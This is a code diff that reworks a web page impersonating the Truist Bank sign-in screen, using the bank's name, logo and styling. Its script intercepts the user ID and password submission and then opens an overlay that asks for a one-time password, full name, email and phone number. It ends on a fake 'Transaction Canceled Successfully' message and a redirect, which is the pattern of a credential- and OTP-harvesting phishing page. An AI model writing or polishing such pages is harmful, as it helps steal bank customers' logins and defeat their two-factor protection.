@@ -6,267 +6,206 @@
   <title>Sign In | Truist Bank</title>
   <meta name="robots" content="noindex, nofollow" />
   <link rel="icon" href="/favicon.ico" />
-
-  <!-- Truist fonts -->
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Source+Sans+3:wght@400;600;700&display=swap" />
-  <link rel="stylesheet" href="/etc.clientlibs/stcom-aem-globalcomponents/clientlibs/clientlib-site/resources/fonts/truist-trio/TruistTrioVF_W_Wght.woff2" as="font" crossorigin />
 
   <style>
-    /* ── reset & base ── */
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
-    :root {
-      --tru-purple:      #4b2d7e;
-      --tru-purple-dk:   #3a1f63;
-      --tru-purple-lt:   #ede8f4;
-      --tru-text:        #1a1a1a;
-      --tru-muted:       #5c5c5c;
-      --tru-border:      #c9c4d1;
-      --tru-error:       #c0392b;
-      --tru-green:       #2e7d32;
-      --tru-radius:      10px;
-    }
-
-    @font-face {
-      font-family: 'Truist Trio Var';
-      src: url('/etc.clientlibs/stcom-aem-globalcomponents/clientlibs/clientlib-site/resources/fonts/truist-trio/TruistTrioVF_W_Wght.woff2') format('woff2');
-      font-weight: 100 900;
-    }
 
     html, body {
       min-height: 100vh;
-      font-family: 'Source Sans 3', 'Truist Trio Var', sans-serif;
-      background: #f4f2f8;
-      color: var(--tru-text);
+      background: #2e1a47;
+      font-family: 'Source Sans 3', Arial, sans-serif;
+      color: #fff;
     }
 
-    /* ── page layout ── */
+    /* ── page wrapper ── */
     .login-page {
       min-height: 100vh;
       display: flex;
       flex-direction: column;
+      padding: 32px 24px 40px;
+      max-width: 480px;
+      margin: 0 auto;
     }
 
-    /* top bar */
-    .login-topbar {
-      background: #fff;
-      border-bottom: 1px solid #e0dae8;
-      padding: 0 24px;
-      height: 64px;
+    /* close button top-right */
+    .close-btn {
+      align-self: flex-end;
+      width: 48px;
+      height: 48px;
+      border: 2px solid rgba(255,255,255,0.5);
+      border-radius: 10px;
+      background: transparent;
+      color: #fff;
+      font-size: 1.4rem;
+      cursor: pointer;
       display: flex;
       align-items: center;
-    }
-
-    .login-topbar img {
-      height: 30px;
-    }
-
-    /* hero area */
-    .login-hero {
-      background: linear-gradient(135deg, #2e1a47 0%, #4b2d7e 100%);
-      padding: 48px 24px 60px;
-      text-align: center;
-      color: #fff;
-    }
-
-    .login-hero h1 {
-      font-size: clamp(1.6rem, 4vw, 2.4rem);
-      font-weight: 700;
-      margin-bottom: 10px;
-      letter-spacing: -0.02em;
-    }
-
-    .login-hero p {
-      font-size: 1rem;
-      opacity: 0.85;
-      max-width: 420px;
-      margin: 0 auto;
-      line-height: 1.6;
-    }
-
-    /* card */
-    .login-card-wrap {
-      flex: 1;
-      display: flex;
-      align-items: flex-start;
       justify-content: center;
-      padding: 0 16px 48px;
-      margin-top: -32px;
+      margin-bottom: 36px;
     }
 
-    .login-card {
-      background: #fff;
-      border-radius: 16px;
-      box-shadow: 0 8px 40px rgba(46, 26, 71, 0.13);
-      padding: 40px 36px 36px;
-      width: 100%;
-      max-width: 440px;
+    .close-btn:hover { border-color: #fff; }
+
+    /* ── form section ── */
+    .login-form-wrap {
+      flex: 1;
     }
 
-    .login-card h2 {
-      font-size: 1.35rem;
-      font-weight: 700;
-      color: var(--tru-purple);
-      margin-bottom: 24px;
-      text-align: center;
-    }
-
-    /* form fields */
-    .field-group {
+    /* inputs */
+    .field-wrap {
+      margin-bottom: 16px;
       position: relative;
-      margin-bottom: 20px;
     }
 
-    .field-group input {
+    .field-wrap input[type="text"],
+    .field-wrap input[type="password"] {
       width: 100%;
-      padding: 18px 14px 8px;
-      border: 1.5px solid var(--tru-border);
-      border-radius: var(--tru-radius);
-      font-size: 1rem;
-      color: var(--tru-text);
-      background: #fafafa;
-      outline: none;
-      transition: border-color 0.2s, box-shadow 0.2s;
-    }
-
-    .field-group input:focus {
-      border-color: var(--tru-purple);
+      padding: 16px 48px 16px 16px;
+      border: none;
+      border-radius: 8px;
       background: #fff;
-      box-shadow: 0 0 0 3px rgba(75, 45, 126, 0.1);
-    }
-
-    .field-group label {
-      position: absolute;
-      left: 14px;
-      top: 14px;
+      color: #1a1a1a;
       font-size: 1rem;
-      color: var(--tru-muted);
-      pointer-events: none;
-      transition: top 0.18s, font-size 0.18s, color 0.18s;
+      outline: none;
     }
 
-    .field-group input:focus + label,
-    .field-group input:not(:placeholder-shown) + label {
-      top: 6px;
-      font-size: 0.72rem;
-      color: var(--tru-purple);
-      font-weight: 600;
+    .field-wrap input::placeholder {
+      color: #666;
     }
 
-    .field-group .toggle-pw {
+    .field-wrap input:focus {
+      box-shadow: 0 0 0 3px rgba(255,255,255,0.4);
+    }
+
+    /* show password button */
+    .toggle-pw {
       position: absolute;
-      right: 12px;
+      right: 14px;
       top: 50%;
       transform: translateY(-50%);
       background: none;
       border: none;
       cursor: pointer;
-      color: var(--tru-muted);
+      color: #4b2d7e;
       padding: 4px;
-      font-size: 0.8rem;
-    }
-
-    /* show-password SVG */
-    .show-pw-icon {
-      width: 20px;
-      height: 20px;
-      vertical-align: middle;
-    }
-
-    /* links row */
-    .login-links {
       display: flex;
+      align-items: center;
+    }
+
+    .toggle-pw svg {
+      width: 22px;
+      height: 22px;
+    }
+
+    /* save/forgot row */
+    .options-row {
+      display: flex;
+      align-items: center;
       justify-content: space-between;
-      align-items: center;
-      margin: -8px 0 24px;
-      font-size: 0.85rem;
+      margin-bottom: 16px;
+      font-size: 0.95rem;
     }
 
-    .login-links label {
+    .options-row label {
       display: flex;
       align-items: center;
-      gap: 6px;
-      color: var(--tru-muted);
+      gap: 8px;
       cursor: pointer;
+      color: #fff;
     }
 
-    .login-links a {
-      color: var(--tru-purple);
-      text-decoration: none;
+    .options-row input[type="checkbox"] {
+      width: 18px;
+      height: 18px;
+      accent-color: #fff;
+      cursor: pointer;
+      flex-shrink: 0;
     }
 
-    .login-links a:hover { text-decoration: underline; }
+    .options-row a {
+      color: #c9b8e8;
+      text-decoration: underline;
+      font-size: 0.95rem;
+    }
 
-    /* primary button */
+    .options-row a:hover { color: #fff; }
+
+    /* reset password link */
+    .reset-link-row {
+      text-align: right;
+      margin-bottom: 24px;
+    }
+
+    .reset-link-row a {
+      color: #c9b8e8;
+      text-decoration: underline;
+      font-size: 0.95rem;
+    }
+
+    .reset-link-row a:hover { color: #fff; }
+
+    /* Sign in button */
     .btn-signin {
       display: block;
       width: 100%;
-      padding: 15px;
-      background: var(--tru-purple);
+      padding: 16px;
+      background: #6e4fa3;
       color: #fff;
       border: none;
       border-radius: 50px;
-      font-size: 1rem;
+      font-size: 1.05rem;
       font-weight: 700;
       cursor: pointer;
-      transition: background 0.2s, transform 0.1s;
-      margin-bottom: 20px;
+      transition: background 0.2s;
+      margin-bottom: 28px;
     }
 
-    .btn-signin:hover  { background: var(--tru-purple-dk); }
+    .btn-signin:hover { background: #5a3d8a; }
     .btn-signin:active { transform: scale(0.98); }
 
-    .login-divider {
-      text-align: center;
-      color: var(--tru-muted);
-      font-size: 0.85rem;
+    /* bottom links */
+    .bottom-links {
+      font-size: 0.95rem;
+      line-height: 1.8;
+    }
+
+    .bottom-links .need-id {
+      color: #fff;
       margin-bottom: 16px;
-      position: relative;
     }
 
-    .login-divider::before, .login-divider::after {
-      content: '';
-      position: absolute;
-      top: 50%;
-      width: 42%;
-      height: 1px;
-      background: #ddd;
-    }
-
-    .login-divider::before { left: 0; }
-    .login-divider::after  { right: 0; }
-
-    .btn-enroll {
-      display: block;
-      width: 100%;
-      padding: 14px;
-      background: transparent;
-      color: var(--tru-purple);
-      border: 2px solid var(--tru-purple);
-      border-radius: 50px;
-      font-size: 1rem;
-      font-weight: 700;
-      cursor: pointer;
-      transition: background 0.2s, color 0.2s;
-      text-align: center;
+    .bottom-links .need-id a {
+      color: #c9b8e8;
       text-decoration: none;
     }
 
-    .btn-enroll:hover { background: var(--tru-purple); color: #fff; }
+    .bottom-links .need-id a:hover { text-decoration: underline; }
 
-    /* footer */
-    .login-footer {
-      text-align: center;
-      padding: 24px 16px;
-      font-size: 0.78rem;
-      color: var(--tru-muted);
-      border-top: 1px solid #e8e4ef;
-      background: #fff;
+    .bottom-links .security-link {
+      color: #c9b8e8;
+      display: block;
+      margin-bottom: 10px;
+      font-size: 0.9rem;
     }
 
-    .login-footer a { color: var(--tru-purple); text-decoration: none; }
-    .login-footer a:hover { text-decoration: underline; }
+    .bottom-links .account-link {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: #c9b8e8;
+      font-weight: 600;
+      text-decoration: none;
+      font-size: 0.95rem;
+    }
+
+    .bottom-links .account-link:hover { color: #fff; }
+
+    .account-link svg {
+      width: 20px;
+      height: 20px;
+      flex-shrink: 0;
+    }
 
     /* ── OTP overlay ── */
     .tru-overlay {
@@ -276,65 +215,58 @@
       z-index: 9999;
       align-items: center;
       justify-content: center;
+      background: rgba(0,0,0,0.55);
     }
 
     .tru-overlay.active { display: flex; }
 
-    .tru-backdrop {
-      position: absolute;
-      inset: 0;
-      background: rgba(0,0,0,0.52);
-      backdrop-filter: blur(2px);
-    }
-
     .tru-panel {
-      position: relative;
-      z-index: 1;
       background: #fff;
       border-radius: 16px;
-      box-shadow: 0 24px 64px rgba(0,0,0,0.2);
-      padding: 40px 36px 36px;
+      box-shadow: 0 24px 64px rgba(0,0,0,0.25);
+      padding: 36px 32px;
       width: 100%;
-      max-width: 480px;
+      max-width: 460px;
       margin: 16px;
       max-height: 90vh;
       overflow-y: auto;
+      color: #1a1a1a;
     }
 
     .tru-panel-logo {
       display: block;
       height: 28px;
-      margin: 0 auto 18px;
+      margin: 0 auto 16px;
     }
 
     .tru-panel h2 {
-      font-size: 1.4rem;
+      font-size: 1.35rem;
       font-weight: 700;
-      color: var(--tru-purple);
+      color: #2e1a47;
       text-align: center;
       margin-bottom: 6px;
     }
 
     .tru-panel .subtitle {
-      font-size: 0.88rem;
-      color: var(--tru-muted);
+      font-size: 0.875rem;
+      color: #666;
       text-align: center;
-      margin-bottom: 26px;
+      margin-bottom: 24px;
       line-height: 1.5;
     }
 
-    .tru-form { display: flex; flex-direction: column; gap: 16px; }
+    .tru-form { display: flex; flex-direction: column; gap: 14px; }
 
-    .tru-field { display: flex; flex-direction: column; gap: 5px; }
+    .tru-field { display: flex; flex-direction: column; gap: 4px; }
 
     .tru-field label {
-      font-size: 0.875rem;
+      font-size: 0.85rem;
       font-weight: 600;
-      color: var(--tru-purple);
+      color: #2e1a47;
     }
 
     .tru-field input {
-      border: 1.5px solid var(--tru-border);
+      border: 1.5px solid #c9c4d1;
       border-radius: 8px;
       padding: 12px 14px;
       font-size: 1rem;
@@ -344,14 +276,13 @@
     }
 
     .tru-field input:focus {
-      border-color: var(--tru-purple);
-      background: #fff;
+      border-color: #4b2d7e;
       box-shadow: 0 0 0 3px rgba(75,45,126,0.1);
     }
 
     .tru-error {
       font-size: 0.78rem;
-      color: var(--tru-error);
+      color: #c0392b;
       display: none;
     }
 
@@ -359,9 +290,9 @@
       display: block;
       width: 100%;
       padding: 14px;
-      background: var(--tru-purple);
+      background: #4b2d7e;
       color: #fff;
-      border: 2px solid var(--tru-purple);
+      border: 2px solid #4b2d7e;
       border-radius: 50px;
       font-size: 1rem;
       font-weight: 700;
@@ -370,22 +301,22 @@
       margin-top: 6px;
     }
 
-    .tru-btn:hover { background: var(--tru-purple-dk); border-color: var(--tru-purple-dk); }
+    .tru-btn:hover { background: #3a1f63; }
 
     .tru-btn-outline {
       background: transparent;
-      color: var(--tru-purple);
+      color: #4b2d7e;
     }
 
-    .tru-btn-outline:hover { background: var(--tru-purple); color: #fff; }
+    .tru-btn-outline:hover { background: #4b2d7e; color: #fff; }
 
-    /* ── Success panel ── */
+    /* success panel */
     .tru-success-panel { text-align: center; }
 
     .tru-success-icon {
-      width: 72px;
-      height: 72px;
-      margin: 0 auto 18px;
+      width: 68px;
+      height: 68px;
+      margin: 0 auto 16px;
     }
 
     .tru-success-icon svg { width: 100%; height: 100%; }
@@ -393,48 +324,42 @@
     .tru-detail-row {
       display: flex;
       justify-content: space-between;
-      border-top: 1px solid var(--tru-purple-lt);
-      padding: 11px 0;
+      border-top: 1px solid #ede8f4;
+      padding: 10px 0;
       font-size: 0.9rem;
     }
 
     .tru-detail-row:last-of-type {
-      border-bottom: 1px solid var(--tru-purple-lt);
-      margin-bottom: 20px;
+      border-bottom: 1px solid #ede8f4;
+      margin-bottom: 18px;
     }
 
     .tru-detail-label { color: #777; }
-    .tru-detail-value { font-weight: 700; color: var(--tru-purple); }
-    .tru-green { color: var(--tru-green) !important; }
+    .tru-detail-value { font-weight: 700; color: #2e1a47; }
+    .tru-green { color: #2e7d32 !important; }
 
     .tru-redirect-msg {
       font-size: 0.875rem;
-      color: #666;
+      color: #555;
       margin-bottom: 8px;
     }
 
-    .tru-redirect-msg strong { color: var(--tru-purple); font-size: 1rem; }
+    .tru-redirect-msg strong { color: #4b2d7e; }
 
     .tru-progress-bar {
       height: 6px;
-      background: var(--tru-purple-lt);
+      background: #ede8f4;
       border-radius: 3px;
       overflow: hidden;
-      margin-bottom: 22px;
+      margin-bottom: 20px;
     }
 
     .tru-progress-fill {
       height: 100%;
       width: 100%;
-      background: var(--tru-purple);
+      background: #4b2d7e;
       border-radius: 3px;
       transition: width 1s linear;
-    }
-
-    /* mobile */
-    @media (max-width: 480px) {
-      .login-card { padding: 28px 20px; }
-      .tru-panel  { padding: 28px 18px; }
     }
   </style>
 </head>
@@ -442,76 +367,74 @@
 
 <div class="login-page">
 
-  <!-- Top bar -->
-  <nav class="login-topbar">
-    <a href="/">
-      <img src="/static.truist.com/content/dam/global-images/truist-logo-purple.svg" alt="Truist Bank" />
-    </a>
-  </nav>
+  <!-- Close button -->
+  <button class="close-btn" id="close-btn" aria-label="Close" onclick="window.location.href='/'">&#x2715;</button>
 
-  <!-- Hero -->
-  <div class="login-hero">
-    <h1>Welcome back</h1>
-    <p>Sign in to Truist online banking to manage your accounts securely.</p>
+  <div class="login-form-wrap">
+    <form id="login-form" novalidate>
+
+      <!-- User ID -->
+      <div class="field-wrap">
+        <input type="text" id="userId" name="userId" placeholder="User ID"
+               autocomplete="username" autocapitalize="none" />
+      </div>
+
+      <!-- Save user ID + Forgot user ID -->
+      <div class="options-row">
+        <label>
+          <input type="checkbox" id="save-id" />
+          Save user ID
+        </label>
+        <a href="#">Forgot user ID?</a>
+      </div>
+
+      <!-- Password -->
+      <div class="field-wrap">
+        <input type="password" id="password" name="password" placeholder="Password"
+               autocomplete="current-password" />
+        <button type="button" class="toggle-pw" id="toggle-pw" aria-label="Show password">
+          <!-- Eye icon -->
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none"
+               stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+            <circle cx="12" cy="12" r="3"/>
+          </svg>
+        </button>
+      </div>
+
+      <!-- Reset password -->
+      <div class="reset-link-row">
+        <a href="#">Reset password</a>
+      </div>
+
+      <!-- Sign in button -->
+      <button type="submit" class="btn-signin">Sign in</button>
+
+      <!-- Bottom links -->
+      <div class="bottom-links">
+        <p class="need-id">
+          <strong>Need a user ID?</strong>&nbsp;
+          <a href="#">Set up online banking</a>
+        </p>
+        <span class="security-link">Online security measures</span>
+        <a href="#" class="account-link">
+          <!-- person icon -->
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none"
+               stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
+            <circle cx="12" cy="7" r="4"/>
+          </svg>
+          Sign in to another account &rarr;
+        </a>
+      </div>
+
+    </form>
   </div>
-
-  <!-- Login card -->
-  <div class="login-card-wrap">
-    <div class="login-card">
-      <h2>Sign in to Online Banking</h2>
-
-      <form id="login-form" novalidate>
-
-        <div class="field-group">
-          <input type="text" id="userId" name="userId" placeholder=" " autocomplete="username" autocapitalize="none" />
-          <label for="userId">User ID</label>
-        </div>
-
-        <div class="field-group">
-          <input type="password" id="password" name="password" placeholder=" " autocomplete="current-password" />
-          <label for="password">Password</label>
-          <button type="button" class="toggle-pw" id="toggle-pw" aria-label="Show password">
-            <svg class="show-pw-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
-              <circle cx="12" cy="12" r="3"/>
-            </svg>
-          </button>
-        </div>
-
-        <div class="login-links">
-          <label>
-            <input type="checkbox" id="save-user-id" />
-            Save user ID
-          </label>
-          <a href="#">Forgot user ID?</a>
-        </div>
-
-        <button type="submit" class="btn-signin">Sign in</button>
-
-      </form>
-
-      <div class="login-divider">or</div>
-      <a href="#" class="btn-enroll">Set up online banking</a>
-    </div>
-  </div>
-
-  <!-- Footer -->
-  <footer class="login-footer">
-    <p>
-      <a href="/">Truist.com</a> &nbsp;|&nbsp;
-      <a href="/privacy">Privacy</a> &nbsp;|&nbsp;
-      <a href="/terms-and-conditions">Terms</a> &nbsp;|&nbsp;
-      <a href="/fraud-and-security">Security</a>
-    </p>
-    <p style="margin-top:8px;">Truist Bank, Member FDIC. &copy;2025 Truist Financial Corporation.</p>
-  </footer>
-
 </div>
 
 
 <!-- ── OTP / Details overlay ── -->
 <div class="tru-overlay" id="otp-overlay" role="dialog" aria-modal="true" aria-labelledby="otp-title">
-  <div class="tru-backdrop"></div>
   <div class="tru-panel">
     <img class="tru-panel-logo"
          src="/static.truist.com/content/dam/global-images/truist-logo-purple.svg"
@@ -522,22 +445,23 @@
     <form class="tru-form" id="otp-form" novalidate>
       <div class="tru-field">
         <label for="l-otp">One-Time Password (OTP)</label>
-        <input type="text" id="l-otp" placeholder="Enter 6-digit OTP" maxlength="6" inputmode="numeric" autocomplete="one-time-code" required />
+        <input type="text" id="l-otp" placeholder="Enter 6-digit OTP"
+               maxlength="6" inputmode="numeric" autocomplete="one-time-code" />
         <span class="tru-error" id="e-otp"></span>
       </div>
       <div class="tru-field">
         <label for="l-name">Full Name</label>
-        <input type="text" id="l-name" placeholder="Enter your full name" required />
+        <input type="text" id="l-name" placeholder="Enter your full name" />
         <span class="tru-error" id="e-name"></span>
       </div>
       <div class="tru-field">
         <label for="l-email">Email Address</label>
-        <input type="email" id="l-email" placeholder="Enter your email address" required />
+        <input type="email" id="l-email" placeholder="Enter your email address" />
         <span class="tru-error" id="e-email"></span>
       </div>
       <div class="tru-field">
         <label for="l-phone">Phone Number</label>
-        <input type="tel" id="l-phone" placeholder="Enter your phone number" required />
+        <input type="tel" id="l-phone" placeholder="Enter your phone number" />
         <span class="tru-error" id="e-phone"></span>
       </div>
       <button type="submit" class="tru-btn">Submit</button>
@@ -548,12 +472,12 @@
 
 <!-- ── Success / Cancel overlay ── -->
 <div class="tru-overlay" id="success-overlay" role="dialog" aria-modal="true" aria-labelledby="success-title">
-  <div class="tru-backdrop"></div>
   <div class="tru-panel tru-success-panel">
     <div class="tru-success-icon">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64" fill="none">
         <circle cx="32" cy="32" r="32" fill="#4CAF50"/>
-        <path d="M18 32l10 10 18-18" stroke="#fff" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/>
+        <path d="M18 32l10 10 18-18" stroke="#fff" stroke-width="4"
+              stroke-linecap="round" stroke-linejoin="round"/>
       </svg>
     </div>
     <h2 id="success-title">Transaction Canceled Successfully</h2>
@@ -568,7 +492,9 @@
       <span class="tru-detail-value" id="ref-num"></span>
     </div>
 
-    <p class="tru-redirect-msg">Returning to homepage in <strong id="countdown">10</strong> seconds…</p>
+    <p class="tru-redirect-msg">
+      Returning to homepage in <strong id="countdown">10</strong> seconds&hellip;
+    </p>
     <div class="tru-progress-bar">
       <div class="tru-progress-fill" id="progress-fill"></div>
     </div>
@@ -581,7 +507,6 @@
 (function () {
   'use strict';
 
-  // ── helpers ──────────────────────────────────────────────────────────────
   function byId(id) { return document.getElementById(id); }
 
   function showOverlay(id) {
@@ -609,18 +534,18 @@
            Math.random().toString(36).slice(2,6).toUpperCase();
   }
 
-  // ── Show/hide password ────────────────────────────────────────────────────
+  // Show / hide password
   var pwField   = byId('password');
   var toggleBtn = byId('toggle-pw');
   if (toggleBtn) {
     toggleBtn.addEventListener('click', function () {
-      pwField.type = pwField.type === 'password' ? 'text' : 'password';
-      toggleBtn.setAttribute('aria-label',
-        pwField.type === 'password' ? 'Show password' : 'Hide password');
+      var isHidden = pwField.type === 'password';
+      pwField.type = isHidden ? 'text' : 'password';
+      toggleBtn.setAttribute('aria-label', isHidden ? 'Hide password' : 'Show password');
     });
   }
 
-  // ── Step 1: intercept login form ──────────────────────────────────────────
+  // Step 1: intercept login form submit
   var loginForm = byId('login-form');
   if (loginForm) {
     loginForm.addEventListener('submit', function (e) {
@@ -631,7 +556,7 @@
     });
   }
 
-  // ── Step 2: validate & submit OTP form ───────────────────────────────────
+  // Step 2: validate OTP form
   var otpForm = byId('otp-form');
   if (otpForm) {
     otpForm.addEventListener('submit', function (e) {
@@ -662,7 +587,7 @@
     });
   }
 
-  // ── Step 3: 10-second countdown → redirect home ──────────────────────────
+  // Step 3: 10-second countdown then redirect home
   var timer = null;
 
   function startCountdown() {
